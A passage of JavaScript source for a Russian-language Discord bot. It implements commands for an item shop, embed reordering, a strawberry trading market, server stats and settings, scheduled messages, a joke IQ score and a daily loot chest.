          return ` как новое проклятие. Чтобы избавится от бича камня: ${ curseBase.description }.`;
        }
      }
    ];

    const getTodayItems = () => allItems.filter((e, i) => data.bot.grempen.includes( i.toString(16) ));

    let grempenList;
    let todayItems = grempenList = getTodayItems();

    if (Math.floor(getTime() / 86400000) !== user.shopTime){
      user.grempen = 0;
      user.shopTime = Math.floor(getTime() / 86400000);
    }


    const isBought = (product) => {
      const index = todayItems.indexOf(product);
      if (index === -1)
        return null;

      return (user.grempen & 2 ** index) !== 0;
    }

    const buyFunc = async (name) => {
      const product = allItems.find(item => item.name === name || item.others.includes(name));

      if (!product || isBought(product) !== false){
        const emoji = product ? product.name.split(" ")[0] : "👺";
        const itemList = todayItems.filter(item => item !== product).map(item => item.name.split(" ")[0]).join(" ");
        await msg.msg("<:grempen:753287402101014649> Упс!", {description: `**Сегодня этот предмет (${ emoji }) отсуствует в лавке.**\nЖелаете взлянуть на другие товары?\n${ itemList }`, color: "400606", delete: 8000});
        return;
      }

      if (user.coins < nonNaN(product.value)) {
        await msg.msg("<:grempen:753287402101014649> Т-Вы что удумали?", {description: `Недостаточно коинов, ${product.name} стоит на ${product.value - user.coins} дороже`, color: "400606", delete: 5000});
        return;
      }


      let phrase = product.fn(product);

      if (!isNaN(product.value))
        user.coins -= product.value;


      user.grempen += 2 ** todayItems.indexOf(product);
      msg.author.quest("buyFromGrempen");
      if (user.grempen == 63){
        msg.author.quest("cleanShop");
      }

      return msg.msg("", {description: `Благодарю за покупку ${product.name.split(" ")[0]} !\nЦена в ${ending(product.value, "монет", "", "у", "ы")} просто ничтожна за такую хорошую вещь${phrase}`, author: {name: msg.author.username, iconURL: msg.author.avatarURL()}, color: "400606"});
    }

    if (op.args){
      buyFunc(op.args.toLowerCase());
      return;
    }

    if (user.coins < 80) {
      msg.channel.startTyping();
      await delay(1700);
      msg.channel.stopTyping();
      return msg.msg("<:grempen:753287402101014649>", {description: "Изыди бездомный попрошайка\nбез денег не возвращайся!", color: "541213", delete: 3000});
    }



    const productsToFields = () => {
      const list = todayItems.map((item, i) => {
        let {name, value} = item;

        if (isBought(item)){
          value = "Куплено";
        }

        return {name, value, inline: true};
      })


      return list;
    }

    let embed = {description: `Добро пожаловать в мою лавку, меня зовут Гремпленс и сегодня у нас скидки!\nО, вижу у вас есть **${user.coins}** <:coin:637533074879414272>, не желаете ли чего нибудь приобрести?`, fields: productsToFields(), color: "400606", footer: {text: "Только сегодня, самые горячие цены!"}}
    let shop  = await msg.msg("<:grempen:753287402101014649> Зловещая лавка", embed);

    let react;
    while (true) {
      let reactions = todayItems.filter(item => isBought(item) === false && (isNaN(item.value) || item.value <= user.coins)).map(item => item.name.split(" ")[0]);
      if (reactions.length === 0)
        reactions = ["❌"];

      react = await shop.awaitReact({user: msg.author, type: "all"}, ...reactions);

      if (!react || react === "❌") {
        await shop.reactions.removeAll();
        await shop.msg("Лавка закрыта, приходите ещё <:grempen:753287402101014649>", {edit: true, color: "400606", description: "Чтобы открыть её снова, введите команду `!grempen`, новые товары появляются каждый день.", image: "https://cdn.discordapp.com/attachments/629546680840093696/847381047939432478/grempen.png"});
        return;
      }

      const product = allItems.find(item => item.name.split(" ")[0] === react);
      buyFunc(product.name);




      if (user.coins < 80) {
        msg.channel.startTyping();
        await delay(1200);

        shop.msg("У вас ещё остались коины? Нет? Ну и проваливайте!", {edit: true, delete: 3000});
        msg.channel.stopTyping();
        return;
      }
      embed = {edit: true, description: `У вас есть-остались коины? Отлично! **${user.coins}** <:coin:637533074879414272> хватит, чтобы прикупить чего-нибудь ещё!`, fields: productsToFields(), footer: {text: "Приходите ещё, акции каждый день!"}, color: "400606"};
      await shop.msg("<:grempen:753287402101014649> Зловещая лавка", embed);
    };
  }, {delete: true, cooldown: 10, try: 3, type: "other"}, "гремпленс гремпенс evil_shop зловещая_лавка hell лавка grempens"),

  embeds: new Command(async (msg, op) => {
    let answer = await accept("embeds", {message: "Эта команда находит до 70-ти эмбедов в канале", description: "С её помощью вы можете переставлять местами эмбед сообщения или получить их в JSON формате\nОбратите внимание, всё обычные сообщения будут **удалены**, а эмбеды будут заново отправленны в новом порядке **от имени Призрака**\n\nРеакции:\n • <:json:754777124413505577> - отправляет вам JSON выбранного сообщения\n • <:swap:754780992023167007> - меняет местами два эмбеда\n • <:right:756212089911247021> - применить изменения и завершить команду"}, msg.channel, msg.author.data);
    if (!answer) return;

    let embeds = await msg.channel.messages.fetch({limit: 100, before: (op.args || null)});
      embeds.concat(await msg.channel.messages.fetch({limit: 100, before: embeds.last().id}));

    embeds = embeds.filter(e => e.embeds.find(e => e.type == "rich" && e.color != 10092543)).array();
    embeds.length = Math.min(embeds.length, 70);

    if (!embeds[0]) return msg.msg("В канале не найдено эмбед сообщений", {delete: 3000});

    let input   = embeds.reverse().map((e, i) => (i + 1) + ". " + e.embeds[0].title).join("\n");
    let bot_msg = await msg.msg("	• " + embeds.length + " <a:diamond:725600667586134138>", {description: input, color: "99ffff"});


    let eventFuncDelete = e => {
      if (e.channel.id != msg.channel.id || !e.embeds.find(e => e.type == "rich" && e.color != 10092543)) return;
      let index = embeds.findIndex(el => el.id == e.id);
      if (!index) return;
      embeds.splice(index, 1);

      input = embeds.map((e, i) => (i + 1) + ". " + e.embeds[0].title).join("\n");
      bot_msg.msg("	• " + embeds.length + " <a:diamond:725600667586134138>", {description: input, color: "99ffff", edit: true});
    }
    client.on("messageDelete", eventFuncDelete);
    setTimeout(e => client.removeListener("messageDelete", eventFuncDelete), 600000);

    let eventFuncWrite = e => {
      if (e.channel.id != msg.channel.id || !e.embeds.find(e => e.type == "rich" && e.color != 10092543)) return;

      embeds.push(e);
      let input = embeds.map((e, i) => (i + 1) + ". " + e.embeds[0].title).join("\n");
      bot_msg.msg("	• " + embeds.length + " <a:diamond:725600667586134138>", {description: input, color: "99ffff", edit: true});
    }
    client.on("message", eventFuncWrite);
    setTimeout(e => client.removeListener("message", eventFuncWrite), 600000);


    let react;
    do {
      react = await bot_msg.awaitReact({user: msg.author, type: "one", time: 60000}, "754777124413505577", "754780992023167007", "756212089911247021");
      switch (react) {
        case "754777124413505577":
          answer = await msg.channel.awaitMessage(msg.author, {message: "Введите индекс элемента для получения его в JSON виде", embed: {color: "99ffff"}});
          if (!answer) return;
          answer = Number(answer.content);
          if (isNaN(answer) || embeds.length < answer || answer < 0) {
            msg.msg("Некорректное значение", {description: "Введите число от 1 до " + embeds.length, color: "ff0000", delete: 3000});
            break;
          }

          let element = embeds[answer - 1];
          msg.author.msg("> " + element.embeds[0].title, {description: "```JSON\n" + Discord.Util.escapeCodeBlock( JSON.stringify(element.embeds[0], null, 2) ) + "```"});
          msg.msg("Готово! Лично отправил вам в личные сообщения", {color: "99ffff", delete: 3500});
          break;

        case "754780992023167007":
          answer = await msg.channel.awaitMessage(msg.author, {message: "Чтобы переместить сообщение, введите его позицию и место на которое его нужно переместить", embed: {color: "99ffff"}});
          let indices = answer.content.match(/\d+/g);
          if (!indices[1]){
            msg.msg("Некорректное значение", {description: "Введите 2 числа в диапазоне от 1 до " + embeds.length, color: "ff0000", delete: 3000});
            break;
          }
          embeds.splice(indices[0] - 1, 1, ...embeds.splice(indices[1] - 1, 1, embeds[indices[0] - 1]));

          let input = embeds.map((e, i) => (i + 1) + ". " + e.embeds[0].title).join("\n");
          await bot_msg.msg("	• " + embeds.length + " <a:diamond:725600667586134138>", {description: input, color: "99ffff", edit: true});
          break;

        case "756212089911247021":
          client.removeListener("messageDelete", eventFuncDelete);
          client.removeListener("message", eventFuncWrite);
          await bot_msg.reactions.removeAll();
          bot_msg.msg("Пожалуйста, подождите", {edit: true, delete: 5000});

          embeds.forEach(item => msg.msg(item.embeds[0], {embed: true}).then( e => item.delete() ));
          msg.msg("Готово!", {delete: 2000});
          bot_msg.delete();
          return;
        default:
          client.removeListener("messageDelete", eventFuncDelete);
          client.removeListener("message", eventFuncWrite);
          return bot_msg.delete();
      }
    } while (true);

  }, {delete: true, type: "guild"}, "эмбедс эмбеды ембеды ембедс"),

  berry: new Command(async (msg, op) => {
    const MAX_LIMIT = 35000;
    const INFLATION = 0.2;
    const TAX = 0.02;

    let
      user        = op.user,
      myBerrys    = user.berrys || (user.berrys = 0),
      marketPrise = data.bot.berrysPrise,

      action      = op.args && op.args.split(" ")[0],
      quantity    = op.args && op.args.split(" ")[1];



    const getPrice = (quantity, isBuying = -1) => {
      quantity = isBuying === -1 ?
        Math.min(marketPrise / INFLATION, quantity)
        : quantity;

      // Налог
      const tax = isBuying !== -1 ? 1 : (1 - TAX);
      // Инфляция
      const inflation = (quantity * INFLATION / 2) * isBuying;


      const price = Math.round( (marketPrise + inflation) * quantity * tax );
      return price;
    };

    if (op.memb) {
      myBerrys = op.memb.data.berrys || 0;
      msg.msg("Клубника пользователя", {
        description: `Клубничек — **${ myBerrys }** <:berry:756114492055617558>\nРыночная цена — **${ Math.round(marketPrise) }** <:coin:637533074879414272>`,
        author: {name: op.memb.tag, iconURL: op.memb.avatarURL()},
        footer: {text: `Общая цена ягодок: ${ getPrice(myBerrys, -1) }`}
      });
      return;
    }

    const store = (quantity, isBuying) => {
      // buying == -1 || 1
      myBerrys = user.berrys;

      if (quantity === "+")
        quantity = myBerrys;

      quantity = Math.floor(quantity);

      if ( isNaN(quantity) ){
        msg.msg("Указана строка вместо числа", {color: "ff0000", delete: 5000});
        return;
      }

      if (quantity < 0){
        msg.msg("Введено отрицательное значение.\n<:grempen:753287402101014649> — Укушу.", {color: "ff0000", delete: 5000});
        return;
      }

      if (isBuying < 0 && quantity > myBerrys){
        msg.msg(`Вы не можете продать ${ quantity } <:berry:756114492055617558>, у вас всего ${myBerrys}`, {color: "ff0000", delete: 5000});
        return;
      }

      if (isBuying > 0 && myBerrys + quantity > MAX_LIMIT){
        quantity = Math.max(MAX_LIMIT - myBerrys, 0);
      }

      let prise = getPrice(quantity, isBuying);


      if (isBuying > 0 && user.coins < prise) {
        msg.msg(`Не хватает ${prise - user.coins} <:coin:637533074879414272>`, {delete: 5000});
        return;
      }

      user.coins -= prise * isBuying;
      user.berrys = myBerrys += quantity * isBuying;
      marketPrise = data.bot.berrysPrise = Math.max(data.bot.berrysPrise + quantity * INFLATION * isBuying, 0);

      msg.msg((isBuying > 0) ? `Вы купили ${quantity} <:berry:756114492055617558>! потратив ${ prise } <:coin:637533074879414272>!` : `Вы продали ${quantity} <:berry:756114492055617558> и заработали ${prise} <:coin:637533074879414272>!`, {delete: 5000});
      msg.author.quest("berryActive", msg.channel, quantity);
      msg.author.action("berryBarter", {quantity, msg, op, isBuying, prise});
    }

    if (quantity === "+")
      quantity = user.berrys;

    if (action == "buy"  || action == "купить")  store(quantity, 1);
    if (action == "sell" || action == "продать") store(quantity, -1);

    let message = await msg.msg("", {description: `У вас клубничек — **${ myBerrys }** <:berry:756114492055617558>\nРыночная цена — **${ Math.round(marketPrise) }** <:coin:637533074879414272>\n\nОбщая цена ваших ягодок: ${ getPrice(myBerrys, -1) } (с учётом налога ${ TAX * 100 }% и инфляции)\n\n📥 - Покупка | 📤 - Продажа;`, author: {name: msg.author.tag, iconURL: msg.author.avatarURL()}})
    let react = await message.awaitReact({user: msg.author, type: "all"}, "📥", "📤");
    let answer;

    while (true) {
      switch (react) {
        case "📥":
          if (myBerrys >= MAX_LIMIT){
            msg.msg(`Вы не можете купить больше. Лимит ${ MAX_LIMIT }`, {color: "ff0000", delete: 5000});
            break;
          }

          const getMaxCount = (coins, price) => {

            const a = INFLATION / 2;
            const b = price;
            const c = -coins;

            const discriminant = b ** 2 - 4 * a * c;
            const x2 = (discriminant ** 0.5 - b) / (2 * a);

            return x2;
          }

          let maxCount = getMaxCount(op.user.coins, marketPrise);

          maxCount = Math.min(maxCount, MAX_LIMIT - myBerrys);
          answer = await msg.channel.awaitMessage(msg.author, {message: `Сколько клубник вы хотите купить?\nПо нашим расчётам, вы можете приобрести до (${maxCount.toFixed(2)}) ед. <:berry:756114492055617558> (Beta calculator)`, embed: {description: "[Посмотреть код](https://pastebin.com/Cg9eYndC)"}});
          if (!answer)
            break;

          if (answer.content === "+")
            answer.content = maxCount;

          store(answer.content, 1);
          break;
        case "📤":
          answer = await msg.channel.awaitMessage(msg.author, {message: "Укажите колич-во клубничек на продажу"});
          if (!answer)
            break;

          store(answer.content, -1);
          break;
        default: return message.delete();
      }
      message = await message.msg("", {edit: true, description: `У вас клубничек — **${myBerrys}** <:berry:756114492055617558>\nРыночная цена — **${ Math.round(marketPrise) }** <:coin:637533074879414272>\n\nОбщая цена ваших ягодок: ${getPrice(myBerrys)} (с учётом налога ${ TAX * 100 }% и инфляции)\n\n📥 - Покупка | 📤 - Продажа;`, author: {name: msg.author.tag, iconURL: msg.author.avatarURL()}});
      react = await message.awaitReact({user: msg.author, type: "all"}, "📥", "📤");
    }
  }, {delete: true, cooldown: 15, try: 2, type: "user"}, "клубника клубнички ягода ягоды berrys берри"),

  server: new Command(async (msg, op) => {
    let guild = msg.guild;

    const values = {
      stats: {
        msgs:          `За сегодня: ${  guild.data.day_msg  }`,
        msgsAll:       `Всего: ${  guild.data.day_msg + guild.data.msg_total  }`,
        around:        `В среднем: ${  Math.round((guild.data.day_msg + guild.data.msg_total) / guild.data.days)  }`,
        record:        `Рекорд: ${  ending(guild.data.day_max, "сообщени", "й", "е", "я")  }\n`,
        commands:      `Использовано команд: ${  Object.values(guild.data.commandsUsed).reduce((acc, count) => acc + count, 0)  }`,
        todayCommands: `Сегодня: ${  Object.values(guild.data.commandsUsed).reduce((acc, count) => acc + count, 0) - guild.data.commandsLaunched  }`
      },
      members: {
        count:         `Всего: ${guild.memberCount}`,
        online:        `Онлайн: ${guild.members.cache.filter(e => e.presence.status != "offline").size}`,
        offline:       `Оффлайн: ${guild.members.cache.filter(e => e.presence.status == "offline").size}`
      },
      channels: {
        categories:    `Категорий: ${guild.channels.cache.filter(e => e.type == "category").size}`,
        texted:        `Текстовых: ${guild.channels.cache.filter(e => e.type == "text").size}`,
        voices:        `Голосовых: ${guild.channels.cache.filter(e => e.type == "voice").size}`
      }
    }

    let stats    = Object.values( values.stats ).join("\n");
    let members  = Object.values( values.members ).join("\n");
    let channels = Object.values( values.channels ).join("\n");

    let verification = {
      "NONE": "Отсуствует",
      "LOW": "Низкий",
      "MEDIUM": "Средний",
      "HIGH": "Высокий",
      "VERY_HIGH": "Слишком высокий"
    }

    let fields = [{name: "Участники:", value: members, inline: true}, {name: "Каналы:", value: channels, inline: true}, {name: "**Статистика сообщений:**", value: stats}, {name: `**Владелец:**`, value: guild.owner, inline: true}, {name: `**Ур. Верификации:**`, value: verification[guild.verificationLevel], inline: true}];
    //* CLOVER
    if (guild.data.cloverEffect){

      let
        effect = guild.data.cloverEffect,
        cloverEvent = TimeEvent.eventData.find(e => e.func === "cloverEnd" && e.args.includes(guild.id)),
        timeTo = cloverEvent.ms - getTime(),
        multiplier = 1.08 + (0.07 * ((1 - 0.9242 ** effect.uses) / (1 - 0.9242))),
        parse = {
            day: (timeTo < 86400000) ?
              "сегодня" :
            (timeTo < 86400000 * 7) ?
              new Intl.DateTimeFormat("ru-ru", {weekday: "long"}).format(effect.timestamp) :
              new Intl.DateTimeFormat("ru-ru", {day: "numeric", month: "long"}).format(effect.timestamp),

            time: new Intl.DateTimeFormat("ru-ru", {hour: "2-digit", minute: "2-digit"})
              .format(effect.timestamp)
          };

      fields.unshift({name: "🍀 Действие Клевера", value: `Осталось времени: ${+(timeTo / 3600000).toFixed(2)}ч.\nКлевер был запущен: ${parse.day}, ${parse.time};\nНаград получено: ${effect.coins}\nТекущий множетель: X${multiplier.toFixed(2)}\nКуплено клеверов: ${effect.uses}`});
    }
    //**

    msg.msg(guild.name + " " + ["❤️", "🧡", "💛", "💚", "💙", "💜"].random(), {thumbnail: guild.iconURL(), description: guild.data.description || "Описание не установлено <a:who:638649997415677973>\n`!editServer` для настройки сервера", footer: {text: "Сервер был создан " + timestampToDate(getTime() - guild.createdTimestamp, 3) + " назад." + "\nID: " + guild.id}, image: guild.data.banner, fields});
  }, {delete: true, type: "guild"}, "сервер"),

  editserver: new Command(async (msg, op) => {
    let guild = msg.guild
    let server = guild.data;
    let settingsAll = [
      ["description", "🪧 Настроить описание сервера", "Описание сервера удачно настроено"],
      ["banner", "🌌 Установите баннер", "На сервере есть свой баннер!"],
      ["chatFilter", "🚸 Фильтр чата выключен", "Фильтр чата включён :)"],
      ["hi", "👋 Не настроено приветсвие новых участников ", "«Привет тебе, новый участник»"],
      //["globalXp", "📯 Опыт участников только с этого сервера", "Вы видите настоящий опыт всех участников!"]
    ]

    let channels = [server.chatChannel, server.logChannel, server.hiChannel].map(e => e ? (guild.channels.cache.get(e) || "не найден") : "не установлен").map((e, i) => ["Чат: ", "Для логов: ", "Для приветсвий: "][i] + e);
    let settings = settingsAll.map(e => (server[e[0]]) ? "<a:yes:763371572073201714> " + e[2] : e[1]);

    let randomEmoji = ["🔧", "🔨", "💣", "🛠️", "🔏"].random(),
     message = await msg.msg("Идёт Настройка сервера... " + randomEmoji, {description: settings.join("\n"), footer: {text: "🔂 - отобразить все действия"}, fields: [{name: "🏝️ Назначенные каналы", value: channels}]}),
     react = await message.awaitReact({user: msg.author, type: "all"}, ...settings.map(e => e.split(" ")[0]).filter(e => e != "<a:yes:763371572073201714>"), "🏝️", "🔂"),
     answer, bot_msg;

    while (true) {
      let reactions;
      switch (react) {
        case "🪧":
          bot_msg = await msg.msg("Введите описание вашего чудесного сервера", {description: "Не забывайте использовать шаблоны **!{}** 💚"});
          answer = await bot_msg.channel.awaitMessage(msg.author);

          bot_msg.delete();
          if (answer.content){
            server.description = answer.content;
            msg.msg("Описание установлено! Юху!", {delete: 3000});
          }
          else msg.msg("Время вышло ⏰", {color: "ff0000", delete: 3000});
          break;

        case "🌌":
          bot_msg = await msg.msg("Укажите ссылку на изображение", {description: "Апчхи"});
          answer = await bot_msg.channel.awaitMessage(msg.author);

          answer = answer.content || null;
          bot_msg.delete();
          if (answer && answer.startsWith("http")){
            server.banner = answer;
            msg.msg("Баннер установлен!", {delete: 3000});
          }
          else msg.msg("Вы должны были указать ссылку на изображение", {color: "ff0000", delete: 3000});
          break;

        case "🚸":
          bot_msg = await msg.msg("Включить фильтр чата?", {description: "Подразумивается удаление сообщений которые содержат: рекламу, нецензурную лексику, капс и т.д.\nСейчас эта функция является \"сырой\" и будет продолжать развиваться со временем"});
          answer = await bot_msg.awaitReact({user: msg.author, type: "all"}, "685057435161198594", "763804850508136478");
          bot_msg.delete();

          if (answer == "685057435161198594"){
            server.chatFilter = 1;
            msg.msg("Фильтр включён", {delete: 3000});
          }
          else if (answer == "763804850508136478"){
            server.chatFilter = 0;
            msg.msg("Фильтр выключен", {delete: 3000});
          }
          break;

        case "👋":
          await commands["sethello"].code(msg, op);
          channels = [server.chatChannel, server.logChannel, server.hiChannel].map(e => (e) ? (guild.channels.cache.get(e).toString() || "не найден") : "не установлен").map((e, i) => [ "Чат: ", "Для логов: ", "Для приветсвий: "][i] + e);
          break;

        case "📯":
          bot_msg = await msg.msg("Отображать только опыт заработанный в этой гильдии?", {description: "По стандарту бот показывает весь опыт пользователя, допустим если пользователь заработал 15 уровень на другом сервере, то и на этом сервере у него будет тоже 15\nВы можете изменить это нажав <:mark:685057435161198594>. В этом случае уровень пользователей будет сброшен до 1-го и будучи активными на других серверах, они не будут получать опыт на этом сервере"});
          answer = await bot_msg.awaitReact({user: msg.author, type: "all"}, "685057435161198594", "763804850508136478");
          if (answer == "685057435161198594"){
            server.globalXp = 0;
            msg.msg("Готово.", {delete: 3000});
          }
          else if (answer == "763804850508136478"){
            server.globalXp = 1;
            msg.msg("Ограничение снято!", {delete: 3000});
          }
          break;

        case "🏝️":
          bot_msg = await msg.msg("", {fields: [{name: "Каналы", value: [server.chatChannel, server.logChannel, server.hiChannel].map(e => (e) ? (guild.channels.cache.get(e).toString() || "не найден") : "не установлен").map((e, i) => [ "🔥 Чат: ", "📒 Для логов: ", "👌 Для приветсвий: "][i] + e)}]});
          let channel = await bot_msg.awaitReact({user: msg.author, type: "all"}, "🔥", "📒", "👌");
          bot_msg = await bot_msg.msg("Упомяните канал или введите его айди", {edit: true});
          answer = await bot_msg.channel.awaitMessage(msg.author);
          bot_msg.delete();
          answer = answer.mentions.channels.first() || guild.channels.cache.get(bot_msg.content);

          if (answer){
            server[(channel == "🔥") ? "chatChannel" : (channel == "📒") ? "logChannel" : "hiChannel"] = answer.id;
            channels = [server.chatChannel, server.logChannel, server.hiChannel].map(e => (e) ? (guild.channels.cache.get(e).toString() || "не найден") : "не установлен").map((e, i) => [ "Чат: ", "Для логов: ", "Для приветсвий: "][i] + e);
            msg.msg(`Канал ${answer.name} успешно установлен! ${channel}`, {delete: 3000})
          }
          else msg.msg("Не удалось найти канал", {color: "ff0000"});
          break;

        case "🔂":
          reactions = [...settingsAll.map(e => e[1].split(" ")[0]), "🏝️"];
          break;

        default:
          message.reactions.removeAll();
          message.delete();
          return;
      }
      settings = settingsAll.map(e => (server[e[0]]) ? "<a:yes:763371572073201714> " + e[2] : e[1]);
      message = await message.msg("Идёт Настройка сервера... " + randomEmoji, {description: settings.join("\n"), footer: {text: "🔂 - отобразить все действия"}, edit: true, fields: [{name: "🏝️ Назначенные каналы", value: channels}]});
      reactions = reactions || [...settings.map(e => e.split(" ")[0]).filter(e => e != "<a:yes:763371572073201714>"), "🏝️", "🔂"];
      react = await message.awaitReact({user: msg.author, type: "all"}, ...reactions);
    }

  }, {delete: true, Permissions: 32, type: "guild"}, "настроитьсервер серватиус servatius"),

  postpone: new Command(async (msg, op) => {
    let
      splited = op.args.split(" "),
      time = splited[0],
      text = splited.slice(1).join(" ");

    if (!text) return msg.msg("Неверно введена команда", {description: "Аргументами является {Время} + {Текст}\nПример: `!postpone 11:19 Я люблю мир`", delete: 5000});
    time = time.split(":");
    if (isNaN(time[0]) || isNaN(time[1])) return msg.msg("Неверно введено время", {description: "Часы:Минуты 15:16", color: "ff0000"});
    let date = new Date();

    date.setHours(time[0]);
    date.setMinutes(time[1]);

    let timeTo = date.getTime() - getTime();
    if (timeTo < 60000) return msg.msg(`Я не могу отложить отправку на ${time.join(":")}, текущее время превышает или равно этой метке.\nОбратите внимание, время на сервере — ${(date = new Date()), date.getHours()}:${date.getMinutes()}`, {delete: 5000});
    new TimeEvent("postpone", timeTo, msg.author.id, msg.channel.id, text);
    msg.msg("Готово! Ваше сообщение будет отправленно через " + timestampToDate(timeTo), {delete: 5000});
  }, {cooldown: 1800 , try: 3, delete: true, args: true, myChannelPermissions: 536870912, type: "delete"}, "отложить отложи"),

  iq: new Command(async (msg, op) => {
    let memb = op.memb || client.users.cache.get(op.args) || msg.author;

    let first = true;
    if ("iq" in memb.data) {
      first = false;
    }

    let iq = memb.data.iq = first ? random(30, 140) : Math.max(memb.data.iq, 0);
    let name = (memb === msg.author) ? "вас" : "него";

    let description;
    if (random(18)){
      description = `У ${name}${(!first) ? " всё так же" : ""} ${iq} ${op.command.toUpperCase()}`;
    } else {
      iq = ++memb.data.iq;
      description = `Удивительно у ${name} айкью вырос на одну единицу! Сейчас ${op.command.toUpperCase()} === ${iq}`;
    }
    msg.msg("<a:iq:768047041053196319> + <a:iq:768047041053196319> = ICQ²", {description, author: {iconURL: memb.avatarURL(), name: memb.username}});
  }, {cooldown: 15, try: 2, type: "user"}, "iqmeme icq айкю айкью iqbanana"),

  chest: new Command(async (msg, op) => {

    const cooldown = op.user.CD_32 - getTime();
    if (cooldown > 0) {
      msg.msg(`Сундук заперт, возвращайтесь позже!`, {color: "ffda73", footer: {text: "До открытия: " + timestampToDate(cooldown), iconURL: "https://vignette.wikia.nocookie.net/e2e-expert/images/b/b3/Chest.png/revision/latest?cb=20200108233859"}});
      return;
    }

    const
      user = op.user,
      treasures = {};

    let chest = {
      icon: ["https://cdn.discordapp.com/attachments/629546680840093696/778990528947027988/ezgif.com-gif-maker.gif", "https://cdn.discordapp.com/attachments/629546680840093696/778990564779229234/ezgif.com-gif-maker_1.gif"].random(),
      color: "ffda73"
    }

    if (user.BDay === data.bot.dayDate) {
      treasures.cake = true;
      treasures.bonus = 10;
      user.chestBonus = 30 + nonNaN(user.chestBonus);
    }


    const addTreasure = (item, count) => treasures[item] = treasures[item] ? count + treasures[item] : count;
    const UNREAL_TREASURES = [
        [
          {item: "void", count: 1, _weight: 1},
          {item: "berrys", count: 1, _weight: 4},
          {item: "keys", count: random(2, 3), _weight: 9},
          {item: "trash", count: 0, _weight: 13},
          {item: "exp", count: random(19, 119), _weight: 22},
          {item: "coins", count: random(23, 40), _weight: 46},
          {item: "chilli", count: 1, _weight: 4},
          {item: "gloves", count: 1, _weight: 1}
        ],
        [
          {item: "void", count: 1, _weight: 1},
          {item: "berrys", count: random(1, 2), _weight: 8},
          {item: "keys", count: random(3, 5), _weight: 7},
          {item: "trash", count: 0, _weight: 3},
          {item: "exp", count: random(30, 200), _weight: 22},
          {item: "coins", count: random(88, 148), _weight: 54},
          {item: "chilli", count: 1, _weight: 3},
          {item: "gloves", count: 1, _weight: 2}
        ],
        [
          {item: "void", count: 1, _weight: 1},
          {item: "berrys", count: random(1, 3), _weight: 12},
          {item: "keys", count: 9, _weight: 1},
          {item: "exp", count: random(470), _weight: 22},
          {item: "coins", count: random(304, 479), _weight: 62},
          {item: "gloves", count: 1, _weight: 1},
          {item: "bonus", count: 5, _weight: 1}
        ]
      ][user.chestLevel];


    let itemsQuantity = nonNaN(user.chestBonus);

    user.chestBonus -= itemsQuantity;
    itemsQuantity = 2 + Math.ceil(itemsQuantity / 3);


    let i = itemsQuantity;
    while (i > 0) {
      i--;
      let {item, count} = UNREAL_TREASURES.random({weights: true});
      switch (item){
        case "bonus":
          i += count;
          itemsQuantity += count;
      }
      addTreasure( item, count );
    }



    const handleResourse = (resource, count) => {
      switch (resource) {
        case "trash":
          itemsQuantity -= count
          delete treasures.trash;
          break;

        case "void":
          chest = { color: "3d17a0", icon: "https://media.discordapp.net/attachments/631093957115379733/842122055527694366/image-removebg-preview.png" };
          user.void += count;
          itemsOutput.push( `${ending(count, "Уров", "ней", "ень", "ня")} нестабильности <a:void:768047066890895360>` );
          break;

        case "keys":
          user.keys += count;
          itemsOutput.push( `${ending(count, "Ключ", "ей", "", "а")} 🔩` );

          if (count > 99){
            msg.author.quest("bigHungredBonus");
          }
          break;

        case "coins":
          user.coins += count;
          itemsOutput.push( `${ending(count, "Коин", "ов", "", "а")} <:coin:637533074879414272>` );
          break;

        case "exp":
          user.exp += count;
          let emoji = ["<:crys:637290406958202880>", "<:crys2:763767958559391795>", "<:crys3:763767653571231804>"][Math.min(2, Math.floor(count / 10))];
          itemsOutput.push( `${ending(count, "Опыт", "а", "", "а")} ${emoji}` );
          break;

        case "berrys":
          user.berrys += count;
          itemsOutput.push( `${ending(count, "Клубник", "", "а", "и")} <:berry:756114492055617558>` );
          break;

        case "cake":
          itemsOutput.push("Один Тортик 🎂");
          break;

        case "bonus":
          itemsOutput.push( `${ending(count, "Сокровищ", "", "е", "а")} для этого сундука <a:chest:805405279326961684>`);
          break;

        case "gloves":
          const currentGloves = (user.thiefGloves || "0|0")
            .split("|");

          currentGloves[0] = +currentGloves[0] + count;
          user.thiefGloves = currentGloves.join("|");

          itemsOutput.push( `${ending(count, "Перчат", "ок", "ка", "ки")} 🧤`);
          break;

        case "chilli":
          user.chilli = nonNaN(user.chilli) + count;
          itemsOutput.push( `${ending(count, "Пер", "цев", "ец", "ца")} 🌶️`);
          break;

        default:
          break;
      }
    }

    const itemsOutput = [];
    Object.entries(treasures).forEach(([k, v]) => handleResourse(k, v));


    msg.author.action("openChest", {msg, op, treasures});

    user.CD_32 = new Date().setHours(23, 59, 0) + 120000;
    msg.author.quest("firstChest", msg.channel);



    const embed = {
      title: itemsQuantity > 30 ? "Невероятный сундук" : "Ежедневный сундук",
      description: (itemsOutput.length) ? `БОНУСОВ СУНДУКА — ${ itemsQuantity }:` : "Ежедневный сундук — пуст. Всего-лишь пара бесполезных крабьих ножек и горы песка... <a:penguin:780093060628873296>",
      color: chest.color,
      thumbnail: !itemsOutput.length ? chest.icon : null,
      footer: {text: `Уровень сундука: ${ user.chestLevel + 1 }`}
    }
    const message = await msg.msg(embed.title, embed);
    embed.edit = true;

    while (itemsOutput.length){
      await delay(1500 / (itemsOutput.length / 2));
      embed.description += itemsOutput.splice(0, 1).map(e => `\n${e}`).join("");
      embed.thumbnail = itemsOutput.length ? null : chest.icon;
      await message.msg(embed.title, embed);
    }
  }, {type: "other"}, "сундук daily"),

  level: new Command(async (msg, op) => {
    return;
    //const canvas = require("canvas");

    const FONT_FAMILY = "VAG World";
    await canvas.registerFont("./main/resources/VAG-font.ttf", {family: "VAG World"});

    let
      canv    = canvas.createCanvas(900, 225),
      ctx     = canv.getContext("2d"),
      member  = (op.memb) ? op.memb : (op.args) ? client.users.cache.get(op.args) : msg.author,
      user    = member.data,
      avatar  = member.avatarURL({format: "png"}),

      text, expLine, width, img, gradient;

      gradient = ctx.createLinearGradient(0, 225, 900, 0);
      gradient.addColorStop(0, '#777');
      gradient.addColorStop(1, '#aaa');
      ctx.fillStyle = gradient;
      ctx.fillRect(0, 0, 900, 225);

      ctx.save();
      ctx.fillStyle = "#080918";
      ctx.fillRect(30, 30, 840, 165)

      ctx.lineWidth = 20;
      ctx.lineJoin = 'round';
      ctx.strokeStyle = "#080918";
      ctx.shadowOffsetY = 5;
      ctx.shadowOffsetX = -3;
      ctx.shadowColor = "rgba(200, 200, 215, 0.3)";
      ctx.shadowBlur = 7;

      ctx.beginPath();
      ctx.moveTo(20, 20);
      ctx.lineTo(880, 20);
      ctx.lineTo(880, 205);
      ctx.lineTo(20, 205);
